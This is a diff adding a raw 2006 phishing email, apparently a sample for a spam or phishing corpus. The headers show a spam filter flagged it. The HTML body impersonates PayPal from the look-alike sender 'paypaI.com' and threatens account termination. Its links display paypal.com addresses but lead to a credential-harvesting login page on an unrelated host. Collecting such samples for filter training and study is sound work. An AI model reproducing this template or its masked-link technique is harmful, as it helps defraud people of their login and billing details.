@@ -1,0 +1,145 @@
+Return-Path: <accounts@paypaI.com>
+X-Original-To: user@login.example.com
+Delivered-To: user@login.example.com
+Received: from mail.example.org (mail.example.org [192.168.4.9])
+	by example.com (Postfix) with ESMTP id 683A946860
+	for <user@login.example.com>; Sat, 21 Oct 2006 12:24:38 -0400 (EDT)
+Received: from localhost (localhost [127.0.0.1])
+	by mail.example.org (Postfix) with ESMTP id 4C0ED131F7B3
+	for <user@example.com>; Sat, 21 Oct 2006 12:24:38 -0400 (EDT)
+X-Spam-Flag: YES
+X-Spam-Score: 9.762
+X-Spam-Level: *********
+X-Spam-Status: Yes, score=9.762 tagged_above=-100 required=4
+	tests=[ADVANCE_FEE_1=0, AWL=0.320, BAYES_50=0.001,
+	FORGED_MUA_OUTLOOK=4.056, FORGED_OUTLOOK_HTML=2.713,
+	FORGED_RCVD_HELO=0.135, HTML_40_50=0.496, HTML_MESSAGE=0.001,
+	HTML_TITLE_UNTITLED=0.514, MIME_HTML_ONLY=0.001, NO_REAL_NAME=0.961,
+	TO_CC_NONE=0.131, X_PRIORITY_HIGH=0.433]
+Received: from mail.example.org ([127.0.0.1])
+	by localhost (spammy.monkey.org [127.0.0.1]) (amavisd-new, port 10024)
+	with ESMTP id cU1-3IJ+6klO for <user@example.com>;
+	Sat, 21 Oct 2006 12:24:34 -0400 (EDT)
+X-Greylist: delayed 4366 seconds by postgrey-1.27 at mail.example.org; Sat, 21 Oct 2006 12:24:34 EDT
+Received: from mailserver.jmcss.org (72-4-45-227.373-5.jaxnet.net [72.4.45.227])
+	by mail.example.org (Postfix) with ESMTP
+	for <user@example.com>; Sat, 21 Oct 2006 12:24:34 -0400 (EDT)
+Received: from testing ([68.52.33.236]) by mailserver.jmcss.org with Microsoft SMTPSVC(6.0.3790.1830);
+	 Sat, 21 Oct 2006 11:30:18 -0500
+Reply-To: <aliceann247@yahoo.com>
+From: "PayPal"<accounts@paypaI.com>
+Subject: Billing Information records are out of date.
+Date: Sat, 21 Oct 2006 11:24:28 -0500
+MIME-Version: 1.0
+Content-Type: text/html;
+	charset="Windows-1251"
+Content-Transfer-Encoding: 7bit
+X-Priority: 1
+X-MSMail-Priority: High
+X-Mailer: Microsoft Outlook Express 6.00.2600.0000
+X-MimeOLE: Produced By Microsoft MimeOLE V6.00.2600.0000
+Message-ID: <MAILSERVER1gKmmwOsc00000ded@mailserver.jmcss.org>
+X-OriginalArrivalTime: 21 Oct 2006 16:30:19.0031 (UTC) FILETIME=[32729A70:01C6F52E]
+To: undisclosed-recipients:;
+Status: RO
+X-Status: 
+X-Keywords:                 
+X-UID: 427
+
+<html>
+<head>
+<title>Untitled Document</title>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
+</head>
+
+<body bgcolor="#FFFFFF" text="#000000">
+<p 
+                  align=justify>
+<img src="http://www.paypalobjects.com/en_US/i/header/t1Hdr_hpGraphic_563x115.jpg" width="563" height="115"></p>
+<p 
+                  align=justify><b><font 
+                  face="Verdana, Arial, Helvetica, sans-serif" size=2>Dear PayPal 
+  ® valued member</font></b><font 
+                  face="Verdana, Arial, Helvetica, sans-serif" 
+                  size=2>,</font></p>
+<p align=justify><font 
+                  face="Verdana, Arial, Helvetica, sans-serif" 
+                  size=2>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;It has 
+  come to our attention that your PayPal Billing Information records are out of 
+  date. That requires you to update the Billing Information. <br>
+  &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Failure to update your records 
+  will result in account termination. Please update your records in maximum 48 
+  hours. Once you have updated them, your PayPal session will not be interrupted 
+  and will continue as normal. Failure to update them will result in cancellation 
+  of service, Terms of Service (TOS) violations or future billing problems. Please 
+  follow the link below and update your account information:</font></p>
+<p align=left><font 
+                  face="Verdana, Arial, Helvetica, sans-serif" size=2>
+<a href="http://pictures.stldrunks.com/albums/userpics/10196/www.paypal.com/login.php">https://www.paypal.com/cgi-bin/webscr?cmd=_login-run</a></font></p>
+<p align=left><font 
+                  face="Verdana, Arial, Helvetica, sans-serif" size=2><font 
+                  color=#ffffff>_____</font>Our database will be instantly updated. 
+  We are committed to the responsable use and protection of customer information 
+  on our website. If you have any questions regarding our services, please check 
+  the website or call our customer service.</font></p>
+<p align=left><font 
+                  face="Verdana, Arial, Helvetica, sans-serif">....................................................................................................................................................................................................</font></p>
+<p align=left><font 
+                  face="Verdana, Arial, Helvetica, sans-serif"><b><font 
+                  size=2>Thank you for using PayPal!<br>
+  The PayPal Team</font></b></font></p>
+<p align=left><font 
+                  face="Verdana, Arial, Helvetica, sans-serif" size=2>Your monthly 
+  account statement is available anytime; just log in into your account at
+<a href="http://pictures.stldrunks.com/albums/userpics/10196/www.paypal.com/login.php">https://www.paypal.com/us/HISTORY</a>. 
+  To correct any errors, please contact us through our Help Center at
+<a href="http://pictures.stldrunks.com/albums/userpics/10196/www.paypal.com/login.php">https://www.paypal.com/us/HELP</a>.</font></p>
+<p align=left><font 
+                  face="Verdana, Arial, Helvetica, sans-serif" 
+                  color=#c0c0c0>--------------------------------------------------------------------------------------------------------------------------------------------<font 
+                  size=1><br>
+  FOR INTERNATIONAL PAYMENTS ONLY:<br>
+  Commissions and Fees incurred by sender: $0.00</font></font></p>
+<p align=left><font 
+                  face="Verdana, Arial, Helvetica, sans-serif" color=#c0c0c0 
+                  size=1>Rate of exchange: If and when the Receipt chooses to 
+  withdraw these funds from the PayPal System, and if the withdrawal involves 
+  a currency conversion, the Recipient will convert the funds at the aplicable 
+  currency exchange rate at the time of the withdrawal, and the Recipient may 
+  incur a transaction fee.</font></p>
+<p align=left><font 
+                  face="Verdana, Arial, Helvetica, sans-serif" color=#c0c0c0 
+                  size=1>RIGHT TO REFUND <br>
+  You, the customer, are entitled to a refund of the money to be transmitted as 
+  a result of this agreement if PayPal does not forward the money received from 
+  you in 10 days of the date of its receipt, or does not give instructions committing 
+  an equivalent amount of money to the person designated by you within 10 days 
+  of the date of the receipt of the funds from you unless otherwise instructed 
+  by you.</font></p>
+<p align=left><font 
+                  face="Verdana, Arial, Helvetica, sans-serif" 
+                  color=#c0c0c0><font size=1>If you want a refund, you must mail 
+  or deliver your written request to PayPal at P.O. Box 45950, Omaha, NE 68145-0950. 
+  If you do not receive your refund, you may be entitled to your money back plus 
+  penalty of up to $1.000,00 USD and attorney's fee pursuant to Section 1810.5 
+  of the California Financial Code.<br>
+  </font>--------------------------------------------------------------------------------------------------------------------------------------------</font><font 
+                  face="Verdana, Arial, Helvetica, sans-serif" size=1><font 
+                  color=#c0c0c0><br>
+  Please do not reply to this email. This mailbox is not monitored and you will 
+  not receive a response. For assistance, </font>
+<a href="http://pictures.stldrunks.com/albums/userpics/10196/www.paypal.com/login.php">log 
+  in</a><font color=#c0c0c0> to your PayPal account and choose the Help link located 
+  in the top right corner of any PayPal page.</font></font></p>
+<p align=left><font 
+                  face="Verdana, Arial, Helvetica, sans-serif" size=1><font 
+                  color=#c0c0c0>To receive email notifications in plain text instead 
+  of HTML, update your preferences </font>
+<a href="http://pictures.stldrunks.com/albums/userpics/10196/www.paypal.com/login.php">here</a><font 
+                  color=#c0c0c0>.</font></font></p>
+<p align=left><font 
+                  face="Verdana, Arial, Helvetica, sans-serif" color=#c0c0c0 
+                  size=1>PayPal Email ID PP120</font></p>
+</body>
+</html>
+
